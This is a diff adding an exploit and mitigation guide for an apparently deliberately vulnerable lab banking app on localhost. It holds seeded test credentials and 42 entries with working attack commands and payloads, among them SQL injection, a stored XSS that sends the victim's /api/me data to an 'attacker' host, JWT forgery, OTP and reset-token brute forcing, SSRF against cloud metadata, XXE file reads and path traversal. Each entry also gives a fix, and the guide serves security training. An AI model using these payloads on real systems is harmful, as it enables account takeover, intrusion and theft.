@@ -1,0 +1,600 @@
+================================================================================
+ NovaTrust Bank (vuln-bank) — Vulnerability index, exploit recipes, mitigations
+================================================================================
+
+Default base URL:   http://localhost:3001
+Test credentials:
+  alice.chen       / Password123!         (customer)
+  bob.martinez     / Sunshine99           (customer)
+  carol.singh      / autumn2023           (customer)
+  david.okafor     / Letmein2024          (customer; large balance)
+  eva.lindstrom    / fika4life            (customer)
+  julie.morgan     / Admin2024!           (admin)
+  finance_audit    / AuditTeam2024        (admin; ops account)
+
+Default OTP for MFA:  424242
+Default reset token:  printed on stdout when /forgot is hit
+Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
+
+--------------------------------------------------------------------------------
+ INDEX
+--------------------------------------------------------------------------------
+ [01]  SQL injection — login form          (Ch 13)
+ [02]  SQL injection — accounts search      (Ch 13)
+ [03]  SQL injection — admin user search    (Ch 13)
+ [04]  Reflected XSS — search result page   (Ch 14)
+ [05]  Stored XSS — support messages        (Ch 14)
+ [06]  DOM-based XSS — location.hash sink   (Ch 14, 34)
+ [07]  IDOR / BAC — view any account        (Ch 11)
+ [08]  BAC — admin endpoints unprotected    (Ch 11)
+ [09]  BAC — privilege escalation via GET   (Ch 11, 23)
+ [10]  Mass assignment — register w/ role=admin (A08, Ch 32)
+ [11]  Mass assignment — API PUT /users/:id (Ch 32 API3)
+ [12]  Prototype pollution — lodash.merge   (Ch 31)
+ [13]  Race condition — duplicate transfer  (Ch 29)
+ [14]  No CSRF protection — GET transfer     (Ch 23)
+ [15]  Clickjacking — no X-Frame-Options     (Ch 23)
+ [16]  Open redirect — /go?u= and /login?next= (Ch 16)
+ [17]  Weak password hashing (MD5)           (Ch 12)
+ [18]  JWT — alg=none accepted               (Ch 26)
+ [19]  JWT — weak HS256 secret               (Ch 26)
+ [20]  MFA bypass — client-controlled success (Ch 19)
+ [21]  No rate limiting — MFA + reset brute force (Ch 19)
+ [22]  Weak password reset — 4-digit numeric token (Ch 16, 19)
+ [23]  User enumeration — login + reset messages (Ch 19)
+ [24]  SSRF — webhook validation + statement import (Ch 22)
+ [25]  XXE — XML statement import            (Ch 25)
+ [26]  Path traversal — /statements/file?name= (Ch 11, A05)
+ [27]  Arbitrary file upload — multer disk storage (Ch 24)
+ [28]  Excessive data exposure — /api/me returns SSN + password_md5 (Ch 32 API3)
+ [29]  BOLA — /api/users/:id, /api/accounts/:id (Ch 32 API1)
+ [30]  Improper inventory — /api/v1/users unauth (Ch 32 API9)
+ [31]  CORS — origin reflection w/ credentials (Ch 17, 23)
+ [32]  Cache poisoning — X-Forwarded-Host echoed in Link header (Ch 31)
+ [33]  Debug endpoint exposed — /debug        (Ch 17)
+ [34]  Verbose error pages — full stack trace (Ch 17)
+ [35]  Source-map disclosure — /static/js/app.js.map (Ch 34)
+ [36]  Secret in JS bundle — sk_live_... (Ch 34)
+ [37]  Sensitive data over HTTP — no HSTS / Secure cookie (Ch 12)
+ [38]  Insecure session cookie — HttpOnly=false, no SameSite (Ch 19)
+ [39]  Business logic — negative-amount transfer (Ch 16)
+ [40]  Vulnerable component — jQuery 1.12.4 loaded (Ch 18)
+ [41]  Audit logging — no failed-login records (Ch 21)
+ [42]  Information leak — admin views return password_md5 + SSN in JSON (Ch 12)
+
+
+--------------------------------------------------------------------------------
+ [01] SQL injection — login form
+--------------------------------------------------------------------------------
+Endpoint:   POST /login
+Files:      routes/auth.js (login handler concatenates `username` into SQL)
+
+EXPLOIT
+  curl -i -c j.cookie http://localhost:3001/login \
+    -d "username=' OR '1'='1' --&password=anything&next=/accounts"
+  # Logs in as the first user in the table (alice.chen).
+
+MITIGATION
+  Use parameterised queries (better-sqlite3 supports `.prepare(...).get(?)`).
+  Verify password with a constant-time comparator after argon2id verification.
+
+--------------------------------------------------------------------------------
+ [02] SQL injection — accounts search
+--------------------------------------------------------------------------------
+Endpoint:   GET /accounts/search?q=...
+
+EXPLOIT
+  # union-based — dump password hashes
+  /accounts/search?q=x' UNION SELECT username, password_md5, role FROM users--
+  # boolean-based — confirm injection
+  /accounts/search?q=' OR '1'='1
+
+MITIGATION
+  Use a parameterised LIKE: `db.prepare('SELECT ... LIKE ?').all('%' + q + '%')`.
+
+--------------------------------------------------------------------------------
+ [03] SQL injection — admin user search
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin/users?q=...    (after logging in as ANY user — BAC chain)
+
+EXPLOIT
+  /admin/users?q=%' UNION SELECT 1,username,password_md5,email,ssn,role FROM users--
+
+MITIGATION
+  Parameterised query AND a real role check via middleware.
+
+--------------------------------------------------------------------------------
+ [04] Reflected XSS — search result page
+--------------------------------------------------------------------------------
+Endpoint:   GET /accounts/search?q=<svg onload=alert(1)>
+
+EXPLOIT
+  Visit /accounts/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+  The search heading renders `<%- q %>` unescaped.
+
+MITIGATION
+  Use `<%= q %>` (HTML-escaping) or sanitise with a strict allow-list.
+
+--------------------------------------------------------------------------------
+ [05] Stored XSS — support messages
+--------------------------------------------------------------------------------
+Endpoint:   POST /support/submit  (any logged-in user)
+Triggered:  Admin views /admin
+
+EXPLOIT
+  1. Log in as alice.chen.
+  2. /support submit with body:
+        <img src=x onerror="fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>navigator.sendBeacon('http://attacker/log',t))">
+  3. Admin (julie.morgan) loads /admin — payload fires in their browser.
+
+MITIGATION
+  Render with `<%= %>` (escaped) or sanitise via DOMPurify on render. Add CSP
+  to block inline event handlers and external script loads.
+
+--------------------------------------------------------------------------------
+ [06] DOM-based XSS — location.hash sink
+--------------------------------------------------------------------------------
+File:       public/js/app.js  (slot.innerHTML = decoded hash)
+
+EXPLOIT
+  http://localhost:3001/accounts#<img src=x onerror=alert(document.cookie)>
+
+MITIGATION
+  Use `textContent` instead of `innerHTML`, or sanitise with DOMPurify.
+
+--------------------------------------------------------------------------------
+ [07] IDOR / BAC — view any account
+--------------------------------------------------------------------------------
+Endpoint:   GET /accounts/:id
+
+EXPLOIT
+  Log in as eva.lindstrom. Walk IDs 1..10:
+    for i in 1..10; do curl -b cookies http://localhost:3001/accounts/$i; done
+  All other customers' accounts are returned, including balance and recent tx.
+
+MITIGATION
+  Add `WHERE id = ? AND user_id = ?` to the lookup query.
+
+--------------------------------------------------------------------------------
+ [08] BAC — admin endpoints unprotected
+--------------------------------------------------------------------------------
+Endpoints:  /admin, /admin/users, /admin/users/:id, /admin/promote, /admin/users/:id/delete
+
+EXPLOIT
+  Log in as any customer (alice.chen). Visit /admin directly.
+
+MITIGATION
+  Add `requireRole('admin')` middleware to the whole /admin sub-tree.
+
+--------------------------------------------------------------------------------
+ [09] BAC — privilege escalation via GET
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin/promote?id=<your-id>
+
+EXPLOIT
+  Same as [08] plus: visit /admin/promote?id=1 to make user id=1 an admin.
+  Combine with [14] — an attacker page can <img src> this URL while alice is
+  logged in to silently promote a target.
+
+MITIGATION
+  Use POST + CSRF token + role check.
+
+--------------------------------------------------------------------------------
+ [10] Mass assignment — register w/ role=admin
+--------------------------------------------------------------------------------
+Endpoint:   POST /register
+
+EXPLOIT
+  curl -d "username=evilbob&password=p&email=e@e&role=admin" \
+    http://localhost:3001/register
+  Log in as evilbob — full admin access.
+
+MITIGATION
+  Whitelist the fields the controller accepts; never accept `role` from the form.
+
+--------------------------------------------------------------------------------
+ [11] Mass assignment — API PUT /users/:id
+--------------------------------------------------------------------------------
+Endpoint:   PUT /api/users/:id
+
+EXPLOIT
+  TOKEN=$(curl -s -d '{"username":"alice.chen","password":"Password123!"}' \
+    -H 'Content-Type: application/json' http://localhost:3001/api/login | jq -r .token)
+  curl -X PUT -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+    http://localhost:3001/api/users/1 -d '{"role":"admin","mfa_enabled":0}'
+
+MITIGATION
+  Allow-list updatable fields by role; never expose `role` to the customer
+  endpoint.
+
+--------------------------------------------------------------------------------
+ [12] Prototype pollution — lodash.merge
+--------------------------------------------------------------------------------
+Endpoint:   POST /profile  (settings JSON merged into profile)
+
+EXPLOIT
+  1. As alice.chen, POST /profile with form field:
+       settings = {"__proto__":{"isAdmin":true,"overdraftLimit":99999999}}
+  2. Call /profile/admin-check — response shows `isAdmin: true`.
+
+MITIGATION
+  Use `Object.assign({}, target, source)` w/ key filter, or use `lodash.mergeWith`
+  with a customizer that rejects `__proto__`/`prototype`/`constructor`. Upgrade
+  lodash to 4.17.21+ and pair with a Map-based settings store.
+
+--------------------------------------------------------------------------------
+ [13] Race condition — duplicate transfer
+--------------------------------------------------------------------------------
+Endpoint:   POST /transfer/send (or GET /transfer/send)
+
+EXPLOIT
+  # Issue 20 transfers in parallel for a single account
+  for i in {1..20}; do
+    curl -s -b cookies "http://localhost:3001/transfer/send?from=4002-1188-0001&to=4002-9999-0001&amount=1000000&memo=race" &
+  done; wait
+  # Multiple transfers succeed past the balance check, ending with a
+  # negative balance because the per-row update is not transactional with
+  # the balance read.
+
+MITIGATION
+  Wrap the read-check-update in a single SQL transaction with row locking
+  (e.g. `UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?`).
+
+--------------------------------------------------------------------------------
+ [14] No CSRF protection — GET transfer
+--------------------------------------------------------------------------------
+Endpoint:   GET /transfer/send
+
+EXPLOIT
+  Host this on attacker.example:
+    <img src="http://localhost:3001/transfer/send?from=4002-1188-0001&to=4002-9999-0001&amount=999999&memo=hi" />
+  Browse to it while alice.chen is logged in → transfer sent.
+
+MITIGATION
+  Disallow state-changing GETs. Add a synchroniser/double-submit CSRF token
+  to all POSTs. Set SameSite=Lax on the session cookie at minimum.
+
+--------------------------------------------------------------------------------
+ [15] Clickjacking — no X-Frame-Options
+--------------------------------------------------------------------------------
+EXPLOIT
+  <iframe src="http://localhost:3001/admin/promote?id=2"></iframe>
+  Style the iframe transparent and overlay a "Win a prize" button.
+
+MITIGATION
+  Set `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`) for all
+  authenticated pages.
+
+--------------------------------------------------------------------------------
+ [16] Open redirect — /go?u= and /login?next=
+--------------------------------------------------------------------------------
+EXPLOIT
+  http://localhost:3001/go?u=https://evil.example.com/phish
+  http://localhost:3001/login?next=https://evil.example.com/phish
+
+MITIGATION
+  Validate the destination: allow only relative paths starting with `/` and
+  not `//`. For external redirects, require an allow-list of hostnames.
+
+--------------------------------------------------------------------------------
+ [17] Weak password hashing (MD5)
+--------------------------------------------------------------------------------
+File:       lib/auth.js — md5(password)
+
+EXPLOIT
+  Dump users via [02] / [11], crack hashes:
+    hashcat -m 0 hashes.txt rockyou.txt
+  All seeded passwords crack in seconds.
+
+MITIGATION
+  argon2id (preferred) or bcrypt with cost ≥ 12. Add per-user salt.
+
+--------------------------------------------------------------------------------
+ [18] JWT — alg=none accepted
+--------------------------------------------------------------------------------
+File:       lib/auth.js — verifyToken trusts alg=none
+
+EXPLOIT
+  python -c "import json,base64;h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').strip(b'=');\
+  p=base64.urlsafe_b64encode(b'{\"sub\":1,\"username\":\"alice.chen\",\"role\":\"admin\"}').strip(b'=');\
+  print((h+b'.'+p+b'.').decode())"
+  curl -H "Authorization: Bearer <token>" http://localhost:3001/api/me
+
+MITIGATION
+  Never pass `none` to `algorithms`. Pin to `['HS256']` or `['RS256']`.
+
+--------------------------------------------------------------------------------
+ [19] JWT — weak HS256 secret
+--------------------------------------------------------------------------------
+Secret:     bank-dev-secret-2024
+
+EXPLOIT
+  jwt_tool -C -d /usr/share/wordlists/jwt.secrets.list <token>
+  hashcat -m 16500 <token> rockyou.txt
+
+MITIGATION
+  Use 256-bit random secrets stored in a KMS/secret store.
+
+--------------------------------------------------------------------------------
+ [20] MFA bypass — client-controlled success
+--------------------------------------------------------------------------------
+Endpoint:   POST /mfa/verify
+
+EXPLOIT
+  Log in as a user that has mfa_enabled=1 (enable it via PUT /api/users/:id).
+  Then:
+    curl -b cookies -d 'success=true&next=/accounts' http://localhost:3001/mfa/verify
+
+MITIGATION
+  Never trust client-supplied success flags. Verify the TOTP server-side and
+  count attempts (lock after N failures).
+
+--------------------------------------------------------------------------------
+ [21] No rate limiting — MFA + reset brute force
+--------------------------------------------------------------------------------
+EXPLOIT
+  for i in $(seq 0 999999); do
+    code=$(printf '%06d' $i)
+    s=$(curl -sb cookies -o /dev/null -w '%{http_code}' \
+      -d "code=$code&next=/" http://localhost:3001/mfa/verify)
+    [ "$s" = "302" ] && echo "OTP=$code" && break
+  done
+
+MITIGATION
+  Per-account + per-IP attempt counters with exponential lockout and alerting.
+
+--------------------------------------------------------------------------------
+ [22] Weak password reset — 4-digit numeric token
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl -d 'email=alice.chen@gmail.com' http://localhost:3001/forgot
+  # Then brute the 4-digit token (10 000 candidates):
+  for t in $(seq 1000 9999); do
+    s=$(curl -s -o /dev/null -w '%{http_code}' \
+      -d "email=alice.chen@gmail.com&token=$t&password=Pwned1!" http://localhost:3001/reset)
+    [ "$s" = "302" ] && echo "token=$t" && break
+  done
+
+MITIGATION
+  128-bit URL-safe random tokens, single-use, 15-min TTL, hashed at rest,
+  delivered only via email/SMS.
+
+--------------------------------------------------------------------------------
+ [23] User enumeration — login + reset messages
+--------------------------------------------------------------------------------
+EXPLOIT
+  POST /login   -> "No such user." vs "Password incorrect."
+  POST /forgot  -> "No account with that email."
+
+MITIGATION
+  Return identical text and status codes for both states. Run a dummy hash
+  check even when the user does not exist.
+
+--------------------------------------------------------------------------------
+ [24] SSRF — webhook validation + statement import
+--------------------------------------------------------------------------------
+Endpoints:  POST /webhooks, POST /statements/import
+
+EXPLOIT
+  # Cloud metadata (AWS):
+  curl -b cookies -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
+    http://localhost:3001/statements/import
+  # Internal port scan:
+  for p in 22 80 443 5432 6379; do
+    curl -s -b cookies -d "url=http://127.0.0.1:$p" \
+      http://localhost:3001/statements/import | head -c 40
+  done
+
+MITIGATION
+  Resolve the URL, reject RFC-1918 / loopback / link-local addresses
+  (DNS rebind-safe: verify the resolved IP, then connect to that IP with
+  Host header). Use a network egress allow-list.
+
+--------------------------------------------------------------------------------
+ [25] XXE — XML statement import
+--------------------------------------------------------------------------------
+Endpoint:   POST /statements/import-xml (Content-Type: application/xml)
+
+EXPLOIT (file read on UNIX-like containers)
+  curl -b cookies -H 'Content-Type: application/xml' \
+    --data-binary @- http://localhost:3001/statements/import-xml <<'XML'
+  <?xml version="1.0"?>
+  <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <r>&xxe;</r>
+  XML
+
+  EXPLOIT (SSRF via XXE)
+  <!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+  <r>&xxe;</r>
+
+MITIGATION
+  Disable DOCTYPE processing. Use a parser configured with
+  `disallow-doctype-decl=true` and no external entity resolution.
+
+--------------------------------------------------------------------------------
+ [26] Path traversal — /statements/file?name=
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl -b cookies 'http://localhost:3001/statements/file?name=../../../../etc/hosts'
+  curl -b cookies 'http://localhost:3001/statements/file?name=../../seed.js'
+
+MITIGATION
+  Resolve to absolute path; reject if not within the uploads directory:
+    const safe = path.resolve(UPLOAD_DIR, name);
+    if (!safe.startsWith(UPLOAD_DIR + path.sep)) return 403;
+
+--------------------------------------------------------------------------------
+ [27] Arbitrary file upload
+--------------------------------------------------------------------------------
+EXPLOIT
+  # Drop a webshell (works because Node serves /uploads statically and any
+  # admin who clicks a "PDF" link will execute the redirect/JS)
+  echo '<html><script>alert(document.cookie)</script>' > evil.html
+  curl -b cookies -F 'file=@evil.html' -F 'account_id=1' \
+    http://localhost:3001/statements/upload
+  # Stored at http://localhost:3001/uploads/evil.html
+
+MITIGATION
+  Validate content-type AND magic bytes; rename to a server-generated name;
+  serve from a separate hostname with `Content-Disposition: attachment` and a
+  conservative CSP.
+
+--------------------------------------------------------------------------------
+ [28] Excessive data exposure — /api/me
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl -H "Authorization: Bearer $TOKEN" http://localhost:3001/api/me
+  # Returns password_md5 + ssn + dob.
+
+MITIGATION
+  Pick fields explicitly in the SQL or a serialiser layer:
+    SELECT id, username, email, full_name FROM users WHERE id = ?
+
+--------------------------------------------------------------------------------
+ [29] BOLA — /api/users/:id, /api/accounts/:id
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl -H "Authorization: Bearer $TOKEN" http://localhost:3001/api/users/2
+  for i in 1..20; do curl ".../api/accounts/$i"; done
+
+MITIGATION
+  Enforce `id === jwt.sub` for the user route, and that the account belongs
+  to `jwt.sub` for account routes.
+
+--------------------------------------------------------------------------------
+ [30] Improper inventory — /api/v1/users unauth
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl http://localhost:3001/api/v1/users      # no auth required
+
+MITIGATION
+  Retire old API versions; require auth on every route by middleware default.
+
+--------------------------------------------------------------------------------
+ [31] CORS — origin reflection w/ credentials
+--------------------------------------------------------------------------------
+EXPLOIT
+  Host a page on https://evil.test that fetches /api/me with credentials:include.
+  Server reflects the Origin and sets Allow-Credentials: true → response read
+  by attacker JS.
+
+MITIGATION
+  Allow-list specific origins. Never combine `Allow-Origin: *` or reflection
+  with `Allow-Credentials: true`.
+
+--------------------------------------------------------------------------------
+ [32] Cache poisoning — X-Forwarded-Host echoed in Link header
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin (returns `Link: <https://<XFH>/admin>; rel="canonical"`)
+
+EXPLOIT
+  curl -H 'X-Forwarded-Host: attacker.com' http://localhost:3001/admin -I
+  Subsequent cached responses inherit the poisoned Link → SEO/canonical hijack.
+
+MITIGATION
+  Don't trust upstream proxy headers unless you control the proxy. Compute
+  the canonical URL from a configured base, not from request headers.
+
+--------------------------------------------------------------------------------
+ [33] Debug endpoint exposed
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl http://localhost:3001/debug   # leaks env vars, headers, session, cwd
+
+MITIGATION
+  Gate behind `NODE_ENV !== 'production'` or remove entirely. Better: feature
+  flag via signed admin role check.
+
+--------------------------------------------------------------------------------
+ [34] Verbose error pages
+--------------------------------------------------------------------------------
+EXPLOIT
+  Trigger any error (malformed query) — full stack trace + file paths leak.
+
+MITIGATION
+  In production: generic message + correlation ID. Log full details server-side.
+
+--------------------------------------------------------------------------------
+ [35] Source-map disclosure
+--------------------------------------------------------------------------------
+EXPLOIT
+  curl http://localhost:3001/static/js/app.js.map
+  # Includes original TypeScript w/ STRIPE_KEY, INTERNAL_GATEWAY, HMAC_SECRET.
+
+MITIGATION
+  Don't publish `.map` files in production, or restrict by IP / auth.
+
+--------------------------------------------------------------------------------
+ [36] Secret in JS bundle
+--------------------------------------------------------------------------------
+EXPLOIT
+  grep -oE 'sk_live_[A-Za-z0-9_]+' /static/js/app.js
+
+MITIGATION
+  Never embed server-side secrets in client bundles. Use `NEXT_PUBLIC_*` /
+  `VITE_*` style prefix conventions + secret scanning in CI.
+
+--------------------------------------------------------------------------------
+ [37] Sensitive data over HTTP — no HSTS / Secure cookie
+--------------------------------------------------------------------------------
+MITIGATION
+  Serve only over HTTPS; set `Strict-Transport-Security: max-age=31536000;
+  includeSubDomains; preload`. Mark cookies `Secure`.
+
+--------------------------------------------------------------------------------
+ [38] Insecure session cookie
+--------------------------------------------------------------------------------
+EXPLOIT
+  console.log(document.cookie) — sid cookie readable from JS (HttpOnly=false).
+
+MITIGATION
+  Set cookie flags: `httpOnly: true, secure: true, sameSite: 'lax'`.
+
+--------------------------------------------------------------------------------
+ [39] Business logic — negative-amount transfer
+--------------------------------------------------------------------------------
+EXPLOIT
+  /transfer/send?from=<victim>&to=<mine>&amount=-100000
+  Negative subtraction increases source; addition decreases dest? Depending
+  on signs — try both. Without server-side `amount > 0` check, you can
+  rearrange balances.
+
+MITIGATION
+  Validate `amount > 0`, `from != to`, `currency` matches, daily caps.
+
+--------------------------------------------------------------------------------
+ [40] Vulnerable component — jQuery 1.12.4
+--------------------------------------------------------------------------------
+CVEs:  CVE-2015-9251 (XSS via $.parseHTML), CVE-2019-11358 (proto pollution
+       via $.extend), CVE-2020-11022/11023 ($.html injection)
+
+MITIGATION
+  Upgrade to jQuery 3.7+ or remove jQuery. Add `retire.js` to CI.
+
+--------------------------------------------------------------------------------
+ [41] Audit logging — no failed-login records
+--------------------------------------------------------------------------------
+EXPLOIT
+  Spray 10 000 logins — audit_log table stays empty.
+
+MITIGATION
+  Log every auth event (success/fail) with reason, IP, UA, request_id.
+
+--------------------------------------------------------------------------------
+ [42] Information leak — admin views return password_md5 + SSN
+--------------------------------------------------------------------------------
+EXPLOIT
+  GET /admin/users/1 → JSON includes password_md5, ssn, reset_token.
+
+MITIGATION
+  Even for admins, don't expose hashes or full PII without a redaction layer
+  and audit trail. Never expose a reset token after issuance.
+
+
+================================================================================
+ Reproducibility note
+================================================================================
+After exploitation, reset the lab with:
+   rm -rf data/   # or `Remove-Item -Recurse -Force data`
+   node seed.js
+or just stop the server and re-run `./run.ps1` (auto-reseeds on empty DB).
